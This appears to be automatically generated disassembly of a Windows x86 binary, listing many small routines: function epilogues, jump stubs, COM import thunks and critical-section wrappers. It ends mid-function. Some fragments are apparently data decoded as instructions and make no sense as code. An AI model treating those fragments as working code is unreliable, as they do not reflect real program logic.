mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax ]
sub_40ede2
jmp sub_403b24
sub_40ede9
pop ecx
pop ebp
retn
sub_40ee7b
jmp sub_403b24
sub_40ee82
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40eed2
jmp sub_403b24
sub_40eed9
pop ecx
pop ebp
retn
sub_40ef26
jmp sub_403b24
sub_40ef2d
pop ecx
pop ebp
retn
sub_40efbf
jmp sub_403b24
sub_40efc6
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f016
jmp sub_403b24
sub_40f01d
pop ecx
pop ebp
retn
sub_40f265
jmp sub_403b24
sub_40f26c
pop ebx
mov esp ebp
pop ebp
retn
sub_40f382
jmp sub_403b24
sub_40f389
pop ecx
pop ebp
retn
sub_40f38c
push ebx
mov ebx eax
mov eax ebx
call sub_40f624
mov [ ebx ] 0x1
pop ebx
retn
sub_40f638
push eax
call sub_40f624
pop eax
retn
sub_40f898
call sub_40f94c
retn
sub_40f9b0
xchg edx eax
call sub_4132dc
retn
sub_40f9b8
call sub_40fbcc
retn
sub_40fbbd
jmp sub_403b24
sub_40fbc4
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_40fbcc
test [ edx + 0x1 ] 0x40
jne r-xdata
call sub_40f9f4
retn
call sub_40f94c
retn
j_sub_40fbe0
jmp sub_40fbe0
sub_40fc05
retn
sub_40fc64
jmp sub_403b24
sub_40fc6b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40fcb2
jmp sub_403b24
sub_40fcb9
pop ebx
pop ecx
pop ebp
retn
sub_40fcfe
jmp sub_403b24
sub_40fd05
pop ebx
pop ecx
pop ebp
retn
sub_40fd4a
jmp sub_403b24
sub_40fd51
pop ebx
pop ecx
pop ebp
retn
sub_40fd96
jmp sub_403b24
sub_40fd9d
pop ebx
pop ecx
pop ebp
retn
sub_41015f
jmp sub_403b24
sub_410166
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_410200
jmp sub_403b24
sub_410207
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_410675
jmp sub_403870
sub_410730
jmp sub_403870
sub_4107d7
jmp sub_403870
sub_4108d0
jmp sub_403870
sub_4109a9
jmp sub_403870
sub_410a91
jmp sub_403870
sub_410c4e
jmp sub_403b24
sub_410c55
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_410cb7
jmp sub_403b24
sub_410cbe
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_411124
jmp sub_403870
sub_411213
jmp sub_403b24
sub_41121a
mov al [ ebp - 0x1 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4112b8
jmp sub_403b24
sub_4112bf
mov al [ ebp - 0x1 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_41165c
call sub_411314
neg al
sbb eax eax
neg eax
retn
sub_41171d
jmp sub_403b24
sub_411724
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4117cd
jmp sub_403b24
sub_4117d4
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_411d25
jmp sub_403870
sub_411e2c
jmp sub_403b24
sub_411e33
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_411f3d
jmp sub_403b24
sub_411f44
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_412394
jmp sub_403b24
sub_41239b
fild [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4124a5
jmp sub_403b24
sub_4124ac
fild [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4129f2
jmp sub_403b24
sub_4129f9
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412a9d
jmp sub_403b24
sub_412aa4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412ac6
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_404844
retn
sub_412abf
jmp sub_403b24
sub_412ac6
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412b22
jmp sub_403b24
sub_412b29
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412ba5
jmp sub_403b24
sub_4130eb
jmp sub_403b24
sub_4130f2
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_413185
jmp sub_403b24
sub_41318c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4131a9
lea eax [ ebp - 0x14 ]
call sub_40482c
retn
sub_4131a2
jmp sub_403b24
sub_4131a9
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_413206
jmp sub_403b24
sub_41320d
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4132af
jmp sub_403b24
sub_4132cc
jmp sub_403b24
sub_4132d3
mov al [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_41382e
jmp sub_403b24
sub_413835
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4138a6
jmp sub_403b24
sub_4138ad
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_413c38
push eax
call sub_40f624
pop eax
mov [ eax ] 0x7
fstp [ eax + 0x8 ]
fwait
retn
sub_413c4c
push eax
call sub_40f624
pop eax
mov [ eax ] 0x6
fistp [ eax + 0x8 ]
fwait
retn
sub_413ccf
jmp sub_403b24
sub_413cd6
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_413daf
jmp sub_403b24
sub_413db6
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_413e12
jmp sub_403b24
sub_413e19
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_413e20
call sub_413e28
retn
sub_414033
jmp sub_403b24
sub_41405f
jmp sub_403b24
sub_414066
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414293
jmp sub_403b24
sub_41429a
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41453b
jmp sub_403b24
sub_4145c9
jmp sub_403b24
sub_4146b9
jmp sub_403b24
sub_41475b
jmp sub_403b24
sub_414811
jmp sub_403b24
sub_4148b8
cmp [ eax ] 0x8
jb r-xdata
retn
push [ eax + 0xc ]
push [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov [ eax ] 0x0
mov edx esp
call sub_40f94c
add esp 0x10
sub_414b62
jmp sub_403b24
sub_414b69
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414c34
push ecx
mov edx esp
call sub_41670c
pop edx
retn
sub_414c40
cmp ax 0x8
je r-xdata
mov al 0x1
retn
cmp ax 0x100
je r-xdata
xor eax eax
retn
sub_414c54
push ebx
mov ebx eax
mov eax ebx
call sub_414bb0
cmp [ eax ] 0x1
sete al
pop ebx
retn
sub_414cf5
jmp sub_403b24
sub_414cfc
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_414da8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_40f624
mov [ ebx ] 0xa
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
sub_414dc0
mov edx 0x80020004
call sub_414da8
retn
sub_414f70
push ebx
mov ebx eax
mov eax ebx
call sub_414eb8
push eax
call SafeArrayUnaccessData
call sub_40f274
pop ebx
retn
sub_414f88
mov dl 0x1
call sub_414f90
retn
sub_414fb8
mov edx eax
sub dx 0x16
jae r-xdata
xor eax eax
retn
movzx eax ax
lea eax [ eax + eax * 2 ]
mov edx [ rw-data ]
cmp [ edx + eax * 4 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_4150d4
jmp sub_403b24
sub_4150db
pop ebx
mov esp ebp
pop ebp
retn
sub_41523c
jmp sub_403b24
sub_4152b4
xor edx edx
test eax eax
je r-xdata
mov eax edx
retn
xor ecx ecx
mov cl [ eax + 0x1 ]
add eax ecx
mov ecx [ eax + 0x6 ]
test ecx ecx
je r-xdata
mov edx [ ecx ]
sub_4152d0
push ebx
xor ebx ebx
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
pop ebx
retn
cmp [ eax ] 0x11
je r-xdata
inc ebx
call sub_4152b4
sub_4157bf
jmp sub_403b24
sub_4157fa
jmp sub_403b24
sub_415801
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_415ad9
jmp sub_403b24
sub_415b09
jmp sub_403b24
sub_415b10
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_415b9d
jmp sub_403b24
sub_415ba4
pop esi
pop ebx
pop ebp
retn
sub_415ba8
push ebp
mov ebp esp
call sub_416034
pop ebp
retn 0x4
sub_415c34
push ebp
mov ebp esp
call sub_416034
pop ebp
retn 0x4
sub_415f28
jmp sub_403b24
sub_415f2f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415f5c
lea eax [ ebp - 0x140 ]
call sub_404120
lea eax [ ebp - 0x24 ]
mov edx 0x3
call sub_404144
retn
sub_415f55
jmp sub_403b24
sub_415fe3
jmp sub_403b24
sub_415fea
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_403380
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_403744
sub_41600c
xor eax eax
retn
sub_416010
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_416024
mov [ ecx ] 0x8
mov al 0x1
retn
sub_41602c
call sub_40ed98
retn
sub_416034
call sub_40ee88
retn
sub_416044
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_416058
call sub_416034
retn
sub_416070
mov eax edx
mov edx ecx
call sub_40fbcc
retn
sub_41607c
push ebp
mov ebp esp
mov eax edx
mov edx ecx
movzx ecx [ ebp + 0x8 ]
call sub_40fe90
pop ebp
retn 0x4
sub_416090
test [ edx + 0x1 ] 0x40
setne al
retn
sub_416098
push ebp
mov ebp esp
call sub_41603c
pop ebp
retn 0x8
sub_4160a4
mov eax edx
mov edx ecx
call sub_413c60
retn
sub_4160b0
mov eax edx
mov edx ecx
call sub_413cdc
retn
sub_4160bc
push ebp
mov ebp esp
or eax 0xffffffff
pop ebp
retn 0x4
sub_4160c8
push ebp
mov ebp esp
or eax 0xffffffff
pop ebp
retn 0x4
sub_4160fc
mov ax [ edx ]
call sub_414c40
retn
sub_416108
push ebx
push esi
mov esi ecx
mov ebx edx
mov edx esi
mov eax ebx
call sub_414c68
pop esi
pop ebx
retn
sub_41611c
push ebx
push esi
mov esi ecx
mov ebx edx
mov edx esi
mov eax ebx
call sub_408108
pop esi
pop ebx
retn
sub_416421
jmp sub_403b24
sub_416428
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41657b
jmp sub_403b24
sub_4166cc
jmp sub_403b24
sub_4166d3
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4166dc
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x4
sub_4166e8
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x4
sub_4166f4
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_416700
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x4
sub_4167b4
jmp sub_403b24
sub_41687d
jmp sub_403b24
sub_416884
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4168a1
lea eax [ ebp - 0x10 ]
call sub_404120
retn
sub_41689a
jmp sub_403b24
sub_4168a1
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4168ac
call sub_40f38c
retn
sub_4168b4
mov ecx 0xe
call sub_414850
cmp al 0x1
retn
sub_416933
jmp sub_403b24
sub_41693a
pop ebp
retn
sub_4169dd
jmp sub_403b24
sub_4169e4
pop ebp
retn
sub_416b18
sub [ rw-data ] 0x1
retn
sub_416b21
add eax 0xfffffff0
push eax
mov eax [ eax ]
mov eax [ eax + 0x50 ]
xchg [ esp ] eax
retn
sub_416b2e
add [ esp + 0x4 ] 0xfffffff0
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax ]
j_sub_4160c8
jmp sub_4160c8
sub_416feb
jmp sub_403b24
sub_416ff2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_41731c
jmp sub_403b24
sub_417323
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41738b
jmp sub_403b24
sub_417392
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_417492
jmp sub_403b24
sub_417499
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4178ac
jmp sub_403b24
sub_4178b3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4179eb
jmp sub_403b24
sub_4179f2
mov eax esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_417ab8
push ebx
add esp 0xffffff00
mov ebx ecx
push 0xff
lea ecx [ esp + 0x4 ]
call sub_417a20
mov eax ebx
mov edx esp
call sub_404384
add esp 0x100
pop ebx
retn
sub_417b14
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_404174
pop esi
pop ebx
retn
sub_417bf0
jmp sub_403b24
sub_417bf7
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_417c48
jmp sub_403b24
sub_417c4f
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_417d9c
jmp sub_403b24
sub_417da3
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_417e72
jmp sub_403b24
sub_417e79
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418190
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_40f94c
pop esi
pop ebx
retn
sub_41843a
jmp sub_403b24
sub_418441
pop ebp
retn
sub_418444
sub [ rw-data ] 0x1
retn
sub_418603
dec [ eax ]
xchg [ ecx ] al
ud2
IsEqualGUID
jmp [ __import_lookup_table_12(ole32:IsEqualGUID) ]
CoInitialize
jmp [ __import_lookup_table_12(ole32:CoInitialize) ]
CoUninitialize
jmp [ __import_lookup_table_12(ole32:CoUninitialize) ]
CoGetClassObject
jmp [ CoGetClassObject@IAT ]
CoCreateInstance
jmp [ __import_lookup_table_12(ole32:CoCreateInstance) ]
StringFromCLSID
jmp [ __import_lookup_table_12(ole32:StringFromCLSID) ]
ProgIDFromCLSID
jmp [ __import_lookup_table_12(ole32:ProgIDFromCLSID) ]
CoTaskMemFree
jmp [ __import_lookup_table_12(ole32:CoTaskMemFree) ]
OleSetMenuDescriptor
jmp [ __import_lookup_table_12(ole32:OleSetMenuDescriptor) ]
OleDraw
jmp [ __import_lookup_table_12(ole32:OleDraw) ]
IsAccelerator
jmp [ __import_lookup_table_12(ole32:IsAccelerator) ]
CreateStreamOnHGlobal
jmp [ __import_lookup_table_12(ole32:CreateStreamOnHGlobal) ]
SysFreeString
jmp [ __import_lookup_table_13(oleaut32:SysFreeString) ]
GetErrorInfo
jmp [ __import_lookup_table_13(oleaut32:GetErrorInfo) ]
sub_418789
jmp sub_403b24
sub_418790
pop ebp
retn
sub_418794
sub [ rw-data ] 0x1
retn
sub_418bc5
mov eax [ ecx ]
or al 0x0
add [ eax ] al
hlt
sub_419097
add [ esp + 0x4 ] 0xfffffff8
jmp sub_41be44
sub_4190a1
add [ esp + 0x4 ] 0xfffffff8
jmp sub_41be64
sub_419201
[ eax ]
sub_4192b8
pop eax
retn
sub_4193ba
inc ecx
add al dl

sub_419c87
add [ esp + 0x4 ] 0xffffffd8
jmp sub_424278
sub_419c91
add [ esp + 0x4 ] 0xffffffd8
jmp sub_424298
sub_419c9b
add [ esp + 0x4 ] 0xffffffd4
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
sub_419dc3
push ecx
push eax
[ esi + edi + 0x3eb40042 ]
sub_41a008
push ecx
mov [ esp ] ax
mov [ esp + 0x2 ] dx
mov eax [ esp ]
pop edx
retn
sub_41a12c
mov eax [ eax + 0xc ]
call sub_41b4f8
retn
sub_41a403
jmp sub_403b24
sub_41a40a
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41a410
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_41b6b0
test eax eax
setge al
pop esi
pop ebx
retn
sub_41a713
jmp sub_403b24
sub_41a71a
mov esp ebp
pop ebp
retn
sub_41a7e8
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_41a7f4
push ebx
mov ebx edx
mov edx ebx
call sub_41a608
test eax eax
je r-xdata
pop ebx
retn
mov edx ebx
call sub_41a368
sub_41a8a0
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_41a9fb
jmp sub_403b24
sub_41aacf
jmp sub_403b24
sub_41aae0
mov eax [ eax - 0x38 ]
or eax eax
je r-xdata
retn
mov eax [ eax + 0x2 ]
sub_41ab4c
jmp sub_403b24
sub_41ab53
pop ebx
mov esp ebp
pop ebp
retn
sub_41ab9e
jmp sub_403b24
sub_41aba5
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_41ac31
jmp sub_403b24
sub_41ac38
pop ebx
pop ebp
retn
sub_41ac7e
jmp sub_403b24
sub_41ac85
pop ebx
pop ebp
retn
sub_41acca
jmp sub_403b24
sub_41acd1
pop ebx
pop ebp
retn
sub_41ad1b
jmp sub_403b24
sub_41ad22
pop esi
pop ebx
pop ebp
retn
sub_41ad76
jmp sub_403b24
sub_41ad7d
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_41aeaa
jmp sub_403b24
sub_41af26
jmp sub_403b24
sub_41affc
cmp [ rw-data ] 0x0
je r-xdata
retn
mov edx eax
mov eax [ rw-data ]
call sub_41b7f0
sub_41b0ec
jmp sub_403b24
sub_41b276
jmp sub_403b24
sub_41b27d
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41b317
jmp sub_403b24
sub_41b31e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b33d
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_41b336
jmp sub_403b24
sub_41b33d
mov al [ ebp - 0x9 ]
mov esp ebp
pop ebp
retn
sub_41b3a9
jmp sub_403b24
sub_41b3b0
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41b4a8
jmp sub_403b24
sub_41b4af
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403390
retn
sub_41b4c5
jmp sub_403b24
sub_41b52c
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_41b84c
xor edx edx
mov eax ebx
call sub_41b810
pop ebx
retn
sub_41b5a4
mov eax [ ebp + 0x4 ]
retn
sub_41b5da
pop ecx
pop edx
pop esi
pop ebx
retn
sub_41b628
jmp sub_403b24
sub_41b62f
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41b634
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub_41b64c
xor edx edx
call sub_41b654
retn
sub_41b73c
mov edx [ eax + 0x8 ]
dec edx
call sub_41b654
retn
sub_41b8bc
retn
sub_41b976
jmp sub_403b24
sub_41b97d
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_403744
sub_41ba0c
jmp sub_403b24
sub_41ba13
pop ebx
pop ecx
pop ebp
retn
sub_41ba18
push ebx
mov ebx eax
lea eax [ ebx + 0x8 ]
push eax
call EnterCriticalSection
mov eax [ ebx + 0x4 ]
pop ebx
retn
sub_41ba6f
jmp sub_403b24
sub_41ba76
pop ebx
pop ecx
pop ebp
retn
sub_41ba7c
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_41bab8
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd00
call sub_403b5c
retn
sub_41bad0
mov ecx eax
cmp edx eax
jge r-xdata
mov eax ecx
retn
mov ecx edx
sub_41bbab
retn
sub_41bc50
test edx edx
je r-xdata
xor edx edx
call sub_41bc64
retn
xchg edx eax
mov ecx [ eax ]
call [ ecx ]
retn
sub_41bd1a
jmp sub_403b24
sub_41bd21
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41bd34
xchg edx eax
call sub_41bc64
retn
sub_41bd3c
retn
sub_41bdd5
jmp sub_403b24
sub_41bddc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41be32
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
sub_41bf99
jmp sub_403b24
sub_41bfa0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41c034
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
or eax 0xffffffff
retn
mov edx [ edx + 0x8 ]
xchg edx eax
call sub_41b6b0
retn
sub_41c109
jmp sub_403b24
sub_41c110
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41c154
xor edx edx
call sub_41c010
retn
sub_41c2c2
jmp sub_403b24
sub_41c2dc
inc [ eax + 0xc ]
retn
sub_41c2e0
cmp [ eax + 0xc ] 0x0
jne r-xdata
retn
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x1c ]
sub_41c34a
jmp sub_403b24
sub_41c358
dec [ eax + 0xc ]
call sub_41c2e0
retn
sub_41c394
xor eax eax
retn
sub_41c398
push ebx
mov ebx ecx
mov eax ebx
call sub_404120
pop ebx
retn
sub_41c3cc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_41b654
pop esi
pop ebx
retn
sub_41c48e
jmp sub_403b24
sub_41c495
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41c5a5
jmp sub_403b24
sub_41c680
retn
sub_41c684
retn
sub_41c688
retn
sub_41c68c
retn
sub_41c7b6
jmp sub_403b24
sub_41c7bd
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c7da
lea eax [ ebp - 0xc ]
call sub_404120
retn
sub_41c7d3
jmp sub_403b24
sub_41c7da
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41c864
jmp sub_403b24
sub_41c87c
push ebx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
inc [ ebx + 0x8 ]
pop ebx
retn
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_41c938
dec [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
retn
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_41c9e1
jmp sub_403b24
sub_41c9e8
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41c9f4
mov eax [ ebp + 0x4 ]
retn
sub_41ca2a
pop ecx
pop edx
pop esi
pop ebx
retn
sub_41ca78
jmp sub_403b24
sub_41ca7f
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41cb3e
jmp sub_403b24
sub_41cb45
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cb67
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_404144
retn
sub_41cb60
jmp sub_403b24
sub_41cb67
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41cb70
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_41cb78
xor eax eax
retn
sub_41cbc1
jmp sub_403b24
sub_41cbc8
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_41ccdb
jmp sub_403b24
sub_41cce2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41cd77
jmp sub_403b24
sub_41cd7e
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41cdfc
jmp sub_403b24
sub_41ce03
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41ced3
jmp sub_403b24
sub_41ceda
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41cf90
jmp sub_403b24
sub_41cf97
pop esi
pop ecx
pop ebp
retn
sub_41d01c
jmp sub_403b24
sub_41d023
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d040
lea eax [ ebp - 0x8 ]
call sub_404120
retn
sub_41d039
jmp sub_403b24
sub_41d040
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41d0cc
jmp sub_403b24
sub_41d0e9
jmp sub_403b24
sub_41d0f0
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41d12c
retn
sub_41d1af
jmp sub_403b24
sub_41d1b6
mov eax [ ebp - 0x8 ]
call sub_41fdec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d1db
lea eax [ ebp - 0xc ]
call sub_404120
retn
sub_41d1d4
jmp sub_403b24
sub_41d1db
mov esp ebp
pop ebp
retn
sub_41d22b
jmp sub_403b24
sub_41d232
pop esi
pop ecx
pop ebp
retn
sub_41d285
jmp sub_403b24
sub_41d28c
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41d294
retn
sub_41d30f
jmp sub_403b24
sub_41d316
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41d3b3
jmp sub_403b24
sub_41d3ba
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d3d7
lea eax [ ebp - 0x8 ]
call sub_404120
retn
sub_41d3d0
jmp sub_403b24
sub_41d3d7
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41d3dc
retn
sub_41d47c
jmp sub_403b24
sub_41d483
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41d502
jmp sub_403b24
sub_41d509
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41d510
mov eax edx
mov edx ecx
call sub_4082e8
retn
sub_41d51c
push ebx
mov ebx eax
test [ ebx + 0x4 ] 0x4
jne r-xdata
mov al [ ebx + 0x7 ]
pop ebx
retn
mov dl 0x3d
mov eax ebx
call sub_41d534
sub_41d5ac
push ebx
xor ecx ecx
mov ebx [ eax ]
call [ ebx + 0x3c ]
pop ebx
retn
sub_41d61c
push ebx
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x22 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
sub_41d638
push ebx
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x2a ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_41d82c
mov eax [ eax + 0x18 ]
retn
sub_41d830
mov eax [ eax + 0x14 ]
retn
sub_41d8cc
push ebx
push esi
mov esi eax
push 0x0
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop esi
pop ebx
retn
sub_41dad8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
shl edx 0x3
lea eax [ ebx + 0x10 ]
call sub_4027f4
mov [ ebx + 0x18 ] esi
pop esi
pop ebx
retn
sub_41db14
test dl dl
je r-xdata
mov edx [ eax ]
call [ edx + 0x80 ]
retn
mov edx [ eax ]
call [ edx + 0x84 ]
retn
sub_41db2c
push ebx
mov ebx [ eax + 0x10 ]
mov ecx [ ebx + ecx * 8 ]
mov ebx [ eax + 0x10 ]
mov edx [ ebx + edx * 8 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
pop ebx
retn
sub_41db40
mov edx sub_41db2c
mov ecx [ eax ]
call [ ecx + 0x94 ]
retn
sub_41db88
cmp [ eax + 0x1e ] 0x0
je r-xdata
mov eax edx
mov edx ecx
call sub_4082e8
retn
mov eax edx
mov edx ecx
call sub_4082b0
retn
sub_41dc24
retn
sub_41df1c
jmp sub_403b24
sub_41df23
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_41df84
jmp sub_403b24
sub_41df8b
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41dfd0
mov eax [ eax + 0x4 ]
call sub_4089c8
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_41dfe0
mov eax [ eax + 0x4 ]
call sub_4089f4
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_41e01c
push ebx
mov ebx edx
mov ecx eax
mov eax ebx
cdq
push edx
push eax
mov eax ecx
mov edx [ eax ]
call [ edx + 0x8 ]
pop ebx
retn
sub_41e1c5
jmp sub_403b24
sub_41e224
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
retn
sub_41e2b4
push ebx
mov ebx eax
xor edx edx
mov eax ebx
